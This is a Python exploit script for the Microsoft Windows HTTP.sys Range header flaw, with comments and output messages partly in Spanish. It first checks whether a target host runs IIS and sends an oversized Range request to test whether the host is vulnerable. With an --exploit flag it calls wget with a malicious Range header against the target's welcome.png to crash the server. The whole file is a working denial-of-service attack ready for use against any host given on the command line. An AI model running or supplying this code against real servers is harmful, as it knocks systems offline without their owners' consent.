# written by john.b.hale@gmail.com - 2015-04-15
# args added and reformated by Juan Cruz Tommasi - b4sec - 13/04/2020
# usage for poc: python xploit.py -t <hostAddr> -p <port>
# exploiting usage: python xploit.py -t <hostAddr> -p <port> --exploit

import socket
import random
from argparse import ArgumentParser
import os

parser = ArgumentParser(description='Microsoft Windows - HTTP.sys - DoS')
parser.add_argument('-t', '--targethost', type=str, metavar='',required=True, help='Remote Host')
parser.add_argument('-p', '--port', type=int, metavar='', required=True, help='Remote Port')
parser.add_argument('--exploit', type=int, default=0,required=False, help='Shutdown server')
args = parser.parse_args()

ipAddr = args.targethost
port = args.port
hexAllFfff = b'18446744073709551615'

req1 = b'GET / HTTP/1.0\r\n\r\n'
req = b'GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-' + hexAllFfff + b'\r\n\r\n'
xploit = b'GET /welcome.png HTTP/1.1\r\nHost: stuff\r\nRange: bytes=18-' + hexAllFfff + b'\r\n\r\n'

print('[*] Testeando la vulnerabilidad.. ')

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((ipAddr, port))
client_socket.send(req1)
boringResp = client_socket.recv(1024)
if b'Microsoft' not in boringResp:
                print('[*] El objetivo no es IIS')
                exit(0)
client_socket.close()

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((ipAddr, port))
if args.exploit != 0:
    url = str('http://'+ipAddr+':'+str(port)+'/welcome.png')
    print('[*] Lanzando ataque de denegacion de servicio al servidor: ' + url)
    cmd = 'wget --header="Range: bytes=18-18446744073709551615" ' + url
    print('[!!] Payload enviado')
    os.system(cmd)
else:
    client_socket.send(req)
goodResp = client_socket.recv(1024)
print(goodResp)
client_socket.close()

if b'Requested Range Not Satisfiable' in goodResp:
                print('[!!] El host parece Vulnerable a DoS')

elif b' The request has an invalid header name' in goodResp:
                print('[*] Parece que no es vulnerable .. :(')
else:
                print('[*] Respuesta desconocida, no podemos identificar si es vulnerable')
